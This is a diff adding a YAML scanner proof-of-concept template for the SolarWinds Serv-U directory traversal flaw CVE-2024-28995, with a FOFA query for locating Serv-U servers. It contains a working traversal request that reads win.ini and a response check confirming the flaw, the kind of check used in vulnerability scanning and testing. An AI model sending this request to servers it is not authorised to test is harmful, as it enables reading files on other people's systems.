@@ -1,0 +1,17 @@
+id: poc-yaml-solarwinds-serv-u-directory-traversal
+info:
+  name: SolarWinds Serv-U 目录遍历漏洞(CVE-2024-28995)
+  severity: high
+  tags:
+  - CVE-2024-28995
+  - 两高一弱
+  finger: serv-u
+  fofa: server="Serv-U"
+requests:
+- method: GET
+  path: /?InternalDir=/../../../../windows&InternalFile=win.ini
+  expression: "status_code == 200 && \ncontains(body,\"for 16-bit app support\") &&\n\
+    contains(body,\"[files]\") &&\ncontains(headers,\"Server: Serv-U\") &&\n!contains(body,\"\
+    <\")\n"
+variables: {}
+transport: http
